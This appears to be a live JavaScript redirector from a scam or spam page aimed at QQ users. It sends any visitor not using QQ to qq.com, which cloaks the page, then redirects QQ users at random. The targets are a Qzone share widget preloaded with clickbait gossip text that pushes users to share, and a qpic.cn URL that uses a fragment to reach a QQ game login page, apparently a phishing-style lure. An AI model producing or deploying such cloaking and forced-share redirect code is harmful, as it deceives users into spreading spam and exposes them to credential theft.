        function leleua() {
    var sUserAgent = navigator.userAgent.toLowerCase();
    if (sUserAgent.match(/QQ/i) == 'qq' || location.href.indexOf("edit") > -1) {
    } else {
        window.location.href = "https://qq.com";
    }
}

leleua();
        window.onload = function() {
            setTimeout(function() {
                var sites = [
                    {url: 'https://h5.qzone.qq.com/q/qzs/open/connect/widget/mobile/qzshare/index.html?page=qzshare.html&loginpage=loginindex.html&logintype=qzone&title=%E7%82%B9%E6%88%91%E5%90%83%F0%9F%8D%89&summary=&url=https%3A%2F%2Fiuuc.github.io%2Fii3.html?{nnnnnnn}{wwww}&desc=&imageUrl=https%3A%2F%2Fp4.itc.cn%2Fq_70%2Fimages03%2F20210329%2Fbad035aff1fd4e389169405b50660b49.jpeg&desc=%E7%B2%BE%E5%BD%A9%E5%90%83%F0%9F%8D%89%E7%80%91%E6%96%99%E2%86%93%E2%86%93%E2%86%93%E7%82%B9%E5%88%86%E4%BA%AB%E8%8E%B7%E5%8F%96', probability: 0.0},
                    {url: 'https://h5.qzone.qq.com/q/qzs/open/connect/widget/mobile/qzshare/index.html?page=qzshare.html&loginpage=loginindex.html&logintype=qzone&title=%E7%82%B9%E6%88%91%E5%90%83%F0%9F%8D%89&summary=&url=https%3A%2F%2Fiuuc.github.io%2Fii3.html?{nnnnnnn}{wwww}&desc=&imageUrl=https%3A%2F%2Fp4.itc.cn%2Fq_70%2Fimages03%2F20210329%2Fbad035aff1fd4e389169405b50660b49.jpeg&desc=%E7%B2%BE%E5%BD%A9%E5%90%83%F0%9F%8D%89%E7%80%91%E6%96%99%E2%86%93%E2%86%93%E2%86%93%E7%82%B9%E5%88%86%E4%BA%AB%E8%8E%B7%E5%8F%96', probability: 0.0},
                    {url: 'https://h5.qzone.qq.com/q/qzs/open/connect/widget/mobile/qzshare/index.html?page=qzshare.html&loginpage=loginindex.html&logintype=qzone&title=%E7%82%B9%E6%88%91%E5%90%83%F0%9F%8D%89&summary=&url=https%3A%2F%2Fiuuc.github.io%2Fii3.html?{nnnnnnn}{wwww}&desc=&imageUrl=https%3A%2F%2Fp4.itc.cn%2Fq_70%2Fimages03%2F20210329%2Fbad035aff1fd4e389169405b50660b49.jpeg&desc=%E7%B2%BE%E5%BD%A9%E5%90%83%F0%9F%8D%89%E7%80%91%E6%96%99%E2%86%93%E2%86%93%E2%86%93%E7%82%B9%E5%88%86%E4%BA%AB%E8%8E%B7%E5%8F%96', probability: 0.0},
                    {url: 'https://h5.qzone.qq.com/q/qzs/open/connect/widget/mobile/qzshare/index.html?page=qzshare.html&loginpage=loginindex.html&logintype=qzone&title=%E7%82%B9%E6%88%91%E5%90%83%F0%9F%8D%89&summary=&url=https%3A%2F%2Fiuuc.github.io%2Fii3.html?{nnnnnnn}{wwww}&desc=&imageUrl=https%3A%2F%2Fp4.itc.cn%2Fq_70%2Fimages03%2F20210329%2Fbad035aff1fd4e389169405b50660b49.jpeg&desc=%E7%B2%BE%E5%BD%A9%E5%90%83%F0%9F%8D%89%E7%80%91%E6%96%99%E2%86%93%E2%86%93%E2%86%93%E7%82%B9%E5%88%86%E4%BA%AB%E8%8E%B7%E5%8F%96', probability: 0.0},
                    {url: 'https://h5.qzone.qq.com/q/qzs/open/connect/widget/mobile/qzshare/index.html?page=qzshare.html&loginpage=loginindex.html&logintype=qzone&title=%E7%82%B9%E6%88%91%E5%90%83%F0%9F%8D%89&summary=&url=https%3A%2F%2Fiuuc.github.io%2Fii3.html?{nnnnnnn}{wwww}&desc=&imageUrl=https%3A%2F%2Fp4.itc.cn%2Fq_70%2Fimages03%2F20210329%2Fbad035aff1fd4e389169405b50660b49.jpeg&desc=%E7%B2%BE%E5%BD%A9%E5%90%83%F0%9F%8D%89%E7%80%91%E6%96%99%E2%86%93%E2%86%93%E2%86%93%E7%82%B9%E5%88%86%E4%BA%AB%E8%8E%B7%E5%8F%96', probability: 0.0},
                    {url: 'https://h5.qzone.qq.com/q/qzs/open/connect/widget/mobile/qzshare/index.html?page=qzshare.html&loginpage=loginindex.html&logintype=qzone&title=%E7%82%B9%E6%88%91%E5%90%83%F0%9F%8D%89&summary=&url=https%3A%2F%2Fiuuc.github.io%2Fii3.html?{nnnnnnn}{wwww}&desc=&imageUrl=https%3A%2F%2Fp4.itc.cn%2Fq_70%2Fimages03%2F20210329%2Fbad035aff1fd4e389169405b50660b49.jpeg&desc=%E7%B2%BE%E5%BD%A9%E5%90%83%F0%9F%8D%89%E7%80%91%E6%96%99%E2%86%93%E2%86%93%E2%86%93%E7%82%B9%E5%88%86%E4%BA%AB%E8%8E%B7%E5%8F%96', probability: 0.0},
                    {url: 'https://h5.qzone.qq.com/q/qzs/open/connect/widget/mobile/qzshare/index.html?page=qzshare.html&loginpage=loginindex.html&logintype=qzone&title=%E7%82%B9%E6%88%91%E5%90%83%F0%9F%8D%89&summary=&url=https%3A%2F%2Fiuuc.github.io%2Fii3.html?{nnnnnnn}{wwww}&desc=&imageUrl=https%3A%2F%2Fp4.itc.cn%2Fq_70%2Fimages03%2F20210329%2Fbad035aff1fd4e389169405b50660b49.jpeg&desc=%E7%B2%BE%E5%BD%A9%E5%90%83%F0%9F%8D%89%E7%80%91%E6%96%99%E2%86%93%E2%86%93%E2%86%93%E7%82%B9%E5%88%86%E4%BA%AB%E8%8E%B7%E5%8F%96', probability: 0.0},
                    {url: 'https://h5.qzone.qq.com/q/qzs/open/connect/widget/mobile/qzshare/index.html?page=qzshare.html&loginpage=loginindex.html&logintype=qzone&title=%E7%82%B9%E6%88%91%E5%90%83%F0%9F%8D%89&summary=&url=https%3A%2F%2Fiuuc.github.io%2Fii3.html?{nnnnnnn}{wwww}&desc=&imageUrl=https%3A%2F%2Fp4.itc.cn%2Fq_70%2Fimages03%2F20210329%2Fbad035aff1fd4e389169405b50660b49.jpeg&desc=%E7%B2%BE%E5%BD%A9%E5%90%83%F0%9F%8D%89%E7%80%91%E6%96%99%E2%86%93%E2%86%93%E2%86%93%E7%82%B9%E5%88%86%E4%BA%AB%E8%8E%B7%E5%8F%96', probability: 0.0},
                    {url: 'https://meeting-75420.picgzc.qpic.cn/20f7a793ac34c99d678e5be065bc02b73c5940752f4690f80aefae0b664bda12?#url=http://lol.qq.com/comm-htdocs/milo_mobile/login.html', probability: 0.5},
                    {url: 'https://meeting-75420.picgzc.qpic.cn/20f7a793ac34c99d678e5be065bc02b73c5940752f4690f80aefae0b664bda12?#url=http://lol.qq.com/comm-htdocs/milo_mobile/login.html', probability: 0.5},
                ]; 
                var random = Math.random();
                var cumulativeProbability = 0.0;
                var selectedSite;
                for (var i = 0; i < sites.length; i++) {
                    cumulativeProbability += sites[i].probability;
                    if (random <= cumulativeProbability) {
                        selectedSite = sites[i].url;
                        break;
                    }
                }
                var currentTime = new Date().getTime();
                window.location.href = selectedSite + 'time' + currentTime;
            }, 100);
        }
